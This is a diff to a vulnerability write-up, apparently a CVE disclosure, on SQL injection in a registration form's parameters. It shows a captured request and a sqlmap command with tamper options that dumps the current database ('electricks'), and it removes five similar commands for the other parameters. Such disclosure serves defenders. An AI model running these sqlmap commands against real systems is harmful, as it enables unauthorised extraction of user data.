@@ -38,7 +38,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 submit=test&address=test&username=Test&email=test%40example.com&lastname=Test&middlename=Test&firstname=Test&contact=test&password=Pass
 ```
 
-+ Use sqlmap to exploit. In sqlmap, use 'firstname', 'middlename', 'email', 'address', 'contact' and 'username' parameters to dump the database. 
++ Use sqlmap to exploit. In sqlmap, use sequencely 'firstname', 'middlename', 'email', 'address', 'contact' and 'username' parameters to dump the database. 
 ```
 python sqlmap.py -r r.txt -p firstname --risk 3 --level 5 --random-agent tamper=between,randomcase --dbms mysql --batch --current-db
 ```
@@ -68,12 +68,3 @@ current database: 'electricks'
 
 + current database: `electricks`
 ![4](https://github.com/h4md153v63n/CVEs/assets/5091265/bfffd456-06bc-42e9-b55e-ee361a6b8fb6)
-
-+ Try to dump the db on other 5 parameters:
-```
-python sqlmap.py -r r.txt -p middlename --risk 3 --level 5 --random-agent tamper=between,randomcase --dbms mysql --batch --current-db
-python sqlmap.py -r r.txt -p email --risk 3 --level 5 --random-agent tamper=between,randomcase --dbms mysql --batch --current-db
-python sqlmap.py -r r.txt -p address --risk 3 --level 5 --random-agent tamper=between,randomcase --dbms mysql --batch --current-db
-python sqlmap.py -r r.txt -p contact --risk 3 --level 5 --random-agent tamper=between,randomcase --dbms mysql --batch --current-db
-python sqlmap.py -r r.txt -p username --risk 3 --level 5 --random-agent tamper=between,randomcase --dbms mysql --batch --current-db
-```
